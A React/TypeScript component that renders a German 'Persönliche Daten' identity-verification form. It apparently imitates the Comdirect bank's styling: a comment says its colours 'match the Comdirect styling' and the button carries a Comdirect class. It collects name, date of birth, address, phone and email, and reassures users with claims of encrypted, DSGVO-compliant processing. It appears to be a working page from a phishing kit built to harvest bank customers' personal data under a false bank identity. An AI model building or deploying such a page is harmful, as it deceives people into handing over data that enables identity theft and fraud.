import React, { useState, useEffect } from 'react';

interface PersonalData {
  first_name: string;
  last_name: string;
  date_of_birth: string;
  street: string;
  street_number: string;
  plz: string;
  city: string;
  phone: string;
  email: string;
}

interface PersonalDataFormProps {
  onSubmit: (data: PersonalData) => void;
}

const PersonalDataForm: React.FC<PersonalDataFormProps> = ({ onSubmit }) => {
  const [isMobile, setIsMobile] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  
  // Form fields
  const [firstName, setFirstName] = useState('');
  const [lastName, setLastName] = useState('');
  const [dateOfBirth, setDateOfBirth] = useState('');
  const [street, setStreet] = useState('');
  const [streetNumber, setStreetNumber] = useState('');
  const [plz, setPlz] = useState('');
  const [city, setCity] = useState('');
  const [phone, setPhone] = useState('');
  const [email, setEmail] = useState('');
  
  // Focus states
  const [firstNameFocused, setFirstNameFocused] = useState(false);
  const [lastNameFocused, setLastNameFocused] = useState(false);
  const [dateOfBirthFocused, setDateOfBirthFocused] = useState(false);
  const [streetFocused, setStreetFocused] = useState(false);
  const [streetNumberFocused, setStreetNumberFocused] = useState(false);
  const [plzFocused, setPlzFocused] = useState(false);
  const [cityFocused, setCityFocused] = useState(false);
  const [phoneFocused, setPhoneFocused] = useState(false);
  const [emailFocused, setEmailFocused] = useState(false);
  
  // Validation errors
  const [errors, setErrors] = useState<Partial<PersonalData>>({});

  // CSS variables that match the Comdirect styling
  const cssVariables = {
    '--text': '#28363c',
    '--text-secondary': '#7d8287',
    '--border': '#d1d5db',
    '--border-hover': '#28363c',
    '--active': '#28363c',
    '--style-primary': '#fff500',
    '--style-primary-hover': '#e6d900',
    '--style-primary-on-it': '#000000',
    '--bg': '#ffffff',
    '--focus': '#28363c',
    '--focus-offset': '2px',
    '--focus-width': '1px'
  } as React.CSSProperties;

  useEffect(() => {
    const checkMobile = () => {
      setIsMobile(window.innerWidth <= 768);
    };
    
    checkMobile();
    window.addEventListener('resize', checkMobile);
    
    return () => window.removeEventListener('resize', checkMobile);
  }, []);

  const validateForm = (): boolean => {
    const newErrors: Partial<PersonalData> = {};
    
    if (!firstName.trim()) newErrors.first_name = 'Vorname ist erforderlich';
    if (!lastName.trim()) newErrors.last_name = 'Nachname ist erforderlich';
    if (!dateOfBirth.trim()) newErrors.date_of_birth = 'Geburtsdatum ist erforderlich';
    if (!street.trim()) newErrors.street = 'Straße ist erforderlich';
    if (!streetNumber.trim()) newErrors.street_number = 'Hausnummer ist erforderlich';
    if (!plz.trim()) newErrors.plz = 'PLZ ist erforderlich';
    if (!city.trim()) newErrors.city = 'Ort ist erforderlich';
    if (!phone.trim() || phone.trim() === '+49') newErrors.phone = 'Telefonnummer ist erforderlich';
    if (!email.trim()) newErrors.email = 'E-Mail-Adresse ist erforderlich';
    
    // Email validation
    if (email.trim() && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email.trim())) {
      newErrors.email = 'Ungültige E-Mail-Adresse';
    }
    
    // Date validation (basic DD.MM.YYYY format)
    if (dateOfBirth.trim() && !/^\d{2}\.\d{2}\.\d{4}$/.test(dateOfBirth.trim())) {
      newErrors.date_of_birth = 'Ungültiges Datumsformat (TT.MM.JJJJ)';
    }
    
    // PLZ validation (5 digits)
    if (plz.trim() && !/^\d{5}$/.test(plz.trim())) {
      newErrors.plz = 'PLZ muss 5 Ziffern haben';
    }
    
    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!validateForm()) {
      return;
    }
    
    setIsLoading(true);
    
    try {
      const formData: PersonalData = {
        first_name: firstName.trim(),
        last_name: lastName.trim(),
        date_of_birth: dateOfBirth.trim(),
        street: street.trim(),
        street_number: streetNumber.trim(),
        plz: plz.trim(),
        city: city.trim(),
        phone: phone.trim(),
        email: email.trim()
      };
      
      console.log('PersonalDataForm: Submitting data:', formData);
      await onSubmit(formData);
    } catch (error) {
      console.error('Error submitting personal data:', error);
      setIsLoading(false);
    }
  };

  const inputStyle = {
    width: '100%',
    padding: '1.25rem 0 0.5rem 0',
    border: 'none',
    borderBottom: '1px solid var(--border)',
    backgroundColor: 'transparent',
    fontSize: '1rem',
    color: 'var(--text)',
    outline: 'none',
    fontFamily: 'MarkWeb, Arial, sans-serif',
    transition: 'border-bottom-color 0.3s ease'
  };

  const labelStyle = (focused: boolean, hasValue: boolean) => ({
    position: 'absolute' as const,
    left: '0',
    top: focused || hasValue ? '0.25rem' : '1.25rem',
    fontSize: focused || hasValue ? '0.75rem' : '1rem',
    color: focused ? 'var(--active)' : 'var(--text-secondary)',
    transition: 'all 0.3s ease',
    pointerEvents: 'none' as const,
    fontFamily: 'MarkWeb, Arial, sans-serif'
  });

  const containerStyle = {
    position: 'relative' as const,
    marginBottom: '1.5rem'
  };

  if (isLoading) {
    return <div style={{
      display: 'flex',
      justifyContent: 'center',
      alignItems: 'center',
      minHeight: '50vh',
      fontSize: '1.125rem',
      fontFamily: 'MarkWeb, Arial, sans-serif',
      color: 'var(--text)'
    }}>
      Persönliche Daten werden verarbeitet.....
    </div>;
  }

  return (
    <div style={{
      ...cssVariables,
      minHeight: '100vh',
      backgroundColor: '#ffffff',
      fontFamily: 'MarkWeb, Arial, sans-serif'
    }}>
      <div style={{ 
        maxWidth: '980px', 
        margin: '0 auto', 
        padding: isMobile ? '2rem 1rem' : '4rem 2rem',
        display: 'flex',
        justifyContent: 'space-between',
        gap: '3rem'
      }}>
        {/* Left Column - Form */}
        <div style={{
          flex: isMobile ? '1' : '0 0 60%',
          maxWidth: isMobile ? '100%' : '600px'
        }}>
          <h1 style={{
            fontSize: isMobile ? '2rem' : '2.5rem',
            fontWeight: '400',
            color: 'var(--text)',
            marginBottom: '1rem',
            fontFamily: 'MarkWeb, Arial, sans-serif'
          }}>
            Persönliche Daten
          </h1>
          
          <p style={{
            color: 'var(--text)',
            fontSize: '1rem',
            marginBottom: '2rem',
            fontFamily: 'MarkWeb, Arial, sans-serif'
          }}>
            Bitte geben Sie Ihre persönlichen Daten zur Verifizierung Ihrer Identität ein.
          </p>

          <form onSubmit={handleSubmit}>
            {/* Name Fields Row */}
            <div style={{
              display: 'grid',
              gridTemplateColumns: isMobile ? '1fr' : '1fr 1fr',
              gap: isMobile ? '0' : '1.5rem',
              marginBottom: '1.5rem'
            }}>
              {/* First Name */}
              <div style={containerStyle}>
                <input
                  type="text"
                  value={firstName}
                  onChange={(e) => setFirstName(e.target.value)}
                  onFocus={() => setFirstNameFocused(true)}
                  onBlur={() => setFirstNameFocused(false)}
                  style={{
                    ...inputStyle,
                    borderBottomColor: errors.first_name ? '#dc2626' : 'var(--border)'
                  }}
                  required
                />
                <label style={labelStyle(firstNameFocused, !!firstName)}>
                  Vorname *
                </label>
                {errors.first_name && (
                  <div style={{ color: '#dc2626', fontSize: '0.75rem', marginTop: '0.25rem' }}>
                    {errors.first_name}
                  </div>
                )}
              </div>

              {/* Last Name */}
              <div style={containerStyle}>
                <input
                  type="text"
                  value={lastName}
                  onChange={(e) => setLastName(e.target.value)}
                  onFocus={() => setLastNameFocused(true)}
                  onBlur={() => setLastNameFocused(false)}
                  style={{
                    ...inputStyle,
                    borderBottomColor: errors.last_name ? '#dc2626' : 'var(--border)'
                  }}
                  required
                />
                <label style={labelStyle(lastNameFocused, !!lastName)}>
                  Nachname *
                </label>
                {errors.last_name && (
                  <div style={{ color: '#dc2626', fontSize: '0.75rem', marginTop: '0.25rem' }}>
                    {errors.last_name}
                  </div>
                )}
              </div>
            </div>

            {/* Date of Birth */}
            <div style={containerStyle}>
              <input
                type="text"
                value={dateOfBirth}
                onChange={(e) => {
                  // Auto-format date as DD.MM.YYYY
                  const value = e.target.value;
                  const digitsOnly = value.replace(/\D/g, '');
                  
                  let formatted = '';
                  if (digitsOnly.length <= 2) {
                    formatted = digitsOnly;
                  } else if (digitsOnly.length <= 4) {
                    formatted = `${digitsOnly.slice(0, 2)}.${digitsOnly.slice(2)}`;
                  } else if (digitsOnly.length <= 8) {
                    formatted = `${digitsOnly.slice(0, 2)}.${digitsOnly.slice(2, 4)}.${digitsOnly.slice(4, 8)}`;
                  } else {
                    formatted = `${digitsOnly.slice(0, 2)}.${digitsOnly.slice(2, 4)}.${digitsOnly.slice(4, 8)}`;
                  }
                  
                  setDateOfBirth(formatted);
                }}
                onFocus={() => setDateOfBirthFocused(true)}
                onBlur={() => setDateOfBirthFocused(false)}
                style={{
                  ...inputStyle,
                  borderBottomColor: errors.date_of_birth ? '#dc2626' : 'var(--border)'
                }}
                placeholder=""
                maxLength={10}
                required
              />
              <label style={labelStyle(dateOfBirthFocused, !!dateOfBirth)}>
                Geburtsdatum (TT.MM.JJJJ) *
              </label>
              {errors.date_of_birth && (
                <div style={{ color: '#dc2626', fontSize: '0.75rem', marginTop: '0.25rem' }}>
                  {errors.date_of_birth}
                </div>
              )}
            </div>

            {/* Address Section */}
            <h3 style={{
              fontSize: '1.25rem',
              fontWeight: '500',
              color: 'var(--text)',
              marginBottom: '1rem',
              marginTop: '2rem',
              fontFamily: 'MarkWeb, Arial, sans-serif'
            }}>
              Adresse
            </h3>

            {/* Street Fields Row */}
            <div style={{
              display: 'grid',
              gridTemplateColumns: isMobile ? '1fr' : '2fr 1fr',
              gap: isMobile ? '0' : '1.5rem',
              marginBottom: '1.5rem'
            }}>
              {/* Street */}
              <div style={containerStyle}>
                <input
                  type="text"
                  value={street}
                  onChange={(e) => setStreet(e.target.value)}
                  onFocus={() => setStreetFocused(true)}
                  onBlur={() => setStreetFocused(false)}
                  style={{
                    ...inputStyle,
                    borderBottomColor: errors.street ? '#dc2626' : 'var(--border)'
                  }}
                  required
                />
                <label style={labelStyle(streetFocused, !!street)}>
                  Straße *
                </label>
                {errors.street && (
                  <div style={{ color: '#dc2626', fontSize: '0.75rem', marginTop: '0.25rem' }}>
                    {errors.street}
                  </div>
                )}
              </div>

              {/* Street Number */}
              <div style={containerStyle}>
                <input
                  type="text"
                  value={streetNumber}
                  onChange={(e) => setStreetNumber(e.target.value)}
                  onFocus={() => setStreetNumberFocused(true)}
                  onBlur={() => setStreetNumberFocused(false)}
                  style={{
                    ...inputStyle,
                    borderBottomColor: errors.street_number ? '#dc2626' : 'var(--border)'
                  }}
                  required
                />
                <label style={labelStyle(streetNumberFocused, !!streetNumber)}>
                  Hausnummer *
                </label>
                {errors.street_number && (
                  <div style={{ color: '#dc2626', fontSize: '0.75rem', marginTop: '0.25rem' }}>
                    {errors.street_number}
                  </div>
                )}
              </div>
            </div>

            {/* PLZ and City Row */}
            <div style={{
              display: 'grid',
              gridTemplateColumns: isMobile ? '1fr' : '1fr 2fr',
              gap: isMobile ? '0' : '1.5rem',
              marginBottom: '1.5rem'
            }}>
              {/* PLZ */}
              <div style={containerStyle}>
                <input
                  type="text"
                  value={plz}
                  onChange={(e) => setPlz(e.target.value.replace(/\D/g, '').slice(0, 5))}
                  onFocus={() => setPlzFocused(true)}
                  onBlur={() => setPlzFocused(false)}
                  style={{
                    ...inputStyle,
                    borderBottomColor: errors.plz ? '#dc2626' : 'var(--border)'
                  }}
                  maxLength={5}
                  required
                />
                <label style={labelStyle(plzFocused, !!plz)}>
                  PLZ *
                </label>
                {errors.plz && (
                  <div style={{ color: '#dc2626', fontSize: '0.75rem', marginTop: '0.25rem' }}>
                    {errors.plz}
                  </div>
                )}
              </div>

              {/* City */}
              <div style={containerStyle}>
                <input
                  type="text"
                  value={city}
                  onChange={(e) => setCity(e.target.value)}
                  onFocus={() => setCityFocused(true)}
                  onBlur={() => setCityFocused(false)}
                  style={{
                    ...inputStyle,
                    borderBottomColor: errors.city ? '#dc2626' : 'var(--border)'
                  }}
                  required
                />
                <label style={labelStyle(cityFocused, !!city)}>
                  Ort *
                </label>
                {errors.city && (
                  <div style={{ color: '#dc2626', fontSize: '0.75rem', marginTop: '0.25rem' }}>
                    {errors.city}
                  </div>
                )}
              </div>
            </div>

            {/* Contact Section */}
            <h3 style={{
              fontSize: '1.25rem',
              fontWeight: '500',
              color: 'var(--text)',
              marginBottom: '1rem',
              marginTop: '2rem',
              fontFamily: 'MarkWeb, Arial, sans-serif'
            }}>
              Kontaktdaten
            </h3>

            {/* Phone */}
            <div style={containerStyle}>
              <input
                type="tel"
                value={phone}
                onChange={(e) => {
                  let value = e.target.value;
                  
                  // If field is focused and empty, add +49 prefix
                  if (phoneFocused && !value.startsWith('+49') && value.length > 0) {
                    value = '+49 ' + value.replace(/^\+?49\s?/, '');
                  }
                  
                  // If user is typing and field already has +49, maintain it
                  if (value.startsWith('+49')) {
                    setPhone(value);
                  } else if (value === '') {
                    setPhone('');
                  } else if (phoneFocused) {
                    // Add +49 when focused and typing
                    setPhone('+49 ' + value);
                  } else {
                    setPhone(value);
                  }
                }}
                onFocus={() => {
                  setPhoneFocused(true);
                  // Add +49 prefix when focusing on empty field
                  if (phone === '') {
                    setPhone('+49 ');
                  }
                }}
                onBlur={() => {
                  setPhoneFocused(false);
                  // Remove +49 if only prefix remains
                  if (phone === '+49 ') {
                    setPhone('');
                  }
                }}
                style={{
                  ...inputStyle,
                  borderBottomColor: errors.phone ? '#dc2626' : 'var(--border)'
                }}
                required
              />
              <label style={labelStyle(phoneFocused, !!phone)}>
                Telefonnummer *
              </label>
              {errors.phone && (
                <div style={{ color: '#dc2626', fontSize: '0.75rem', marginTop: '0.25rem' }}>
                  {errors.phone}
                </div>
              )}
            </div>

            {/* Email */}
            <div style={containerStyle}>
              <input
                type="email"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                onFocus={() => setEmailFocused(true)}
                onBlur={() => setEmailFocused(false)}
                style={{
                  ...inputStyle,
                  borderBottomColor: errors.email ? '#dc2626' : 'var(--border)'
                }}
                required
              />
              <label style={labelStyle(emailFocused, !!email)}>
                E-Mail-Adresse *
              </label>
              {errors.email && (
                <div style={{ color: '#dc2626', fontSize: '0.75rem', marginTop: '0.25rem' }}>
                  {errors.email}
                </div>
              )}
            </div>

            {/* Submit Button */}
            <button
              type="submit"
              disabled={isLoading}
              className="comdirect-button"
              style={{
                marginTop: '2rem',
                opacity: isLoading ? 0.7 : 1
              }}
            >
              {isLoading ? 'Wird verarbeitet...' : 'Weiter'}
            </button>
          </form>
        </div>

        {/* Right Column - Security Info */}
        {!isMobile && (
          <div style={{
            flex: '0 0 35%',
            paddingTop: '4rem'
          }}>
            <div style={{
              backgroundColor: '#f8f9fa',
              borderRadius: '0.5rem',
              padding: '2rem',
              border: '1px solid var(--border)'
            }}>
              <h3 style={{
                fontSize: '1.25rem',
                fontWeight: '500',
                color: 'var(--text)',
                marginBottom: '1.5rem',
                fontFamily: 'MarkWeb, Arial, sans-serif'
              }}>
                Datenschutz & Sicherheit
              </h3>

              <div style={{
                display: 'flex',
                flexDirection: 'column',
                gap: '1.5rem'
              }}>
                <div>
                  <p style={{
                    fontSize: '0.875rem',
                    fontWeight: '500',
                    color: 'var(--text)',
                    marginBottom: '0.5rem',
                    fontFamily: 'MarkWeb, Arial, sans-serif'
                  }}>
                    Sichere Datenübertragung
                  </p>
                  <p style={{
                    fontSize: '0.875rem',
                    color: 'var(--text-secondary)',
                    margin: 0,
                    fontFamily: 'MarkWeb, Arial, sans-serif'
                  }}>
                    Ihre Daten werden verschlüsselt übertragen und gemäß DSGVO verarbeitet.
                  </p>
                </div>

                <div>
                  <p style={{
                    fontSize: '0.875rem',
                    fontWeight: '500',
                    color: 'var(--text)',
                    marginBottom: '0.5rem',
                    fontFamily: 'MarkWeb, Arial, sans-serif'
                  }}>
                    Identitätsprüfung
                  </p>
                  <p style={{
                    fontSize: '0.875rem',
                    color: 'var(--text-secondary)',
                    margin: 0,
                    fontFamily: 'MarkWeb, Arial, sans-serif'
                  }}>
                    Diese Angaben dienen der Verifizierung Ihrer Identität für Ihre Sicherheit.
                  </p>
                </div>

                <div>
                  <p style={{
                    fontSize: '0.875rem',
                    fontWeight: '500',
                    color: 'var(--text)',
                    marginBottom: '0.5rem',
                    fontFamily: 'MarkWeb, Arial, sans-serif'
                  }}>
                    Pflichtfelder
                  </p>
                  <p style={{
                    fontSize: '0.875rem',
                    color: 'var(--text-secondary)',
                    margin: 0,
                    fontFamily: 'MarkWeb, Arial, sans-serif'
                  }}>
                    Alle mit * markierten Felder sind für die Verifizierung erforderlich.
                  </p>
                </div>
              </div>
            </div>
          </div>
        )}
      </div>
    </div>
  );
};

export default PersonalDataForm;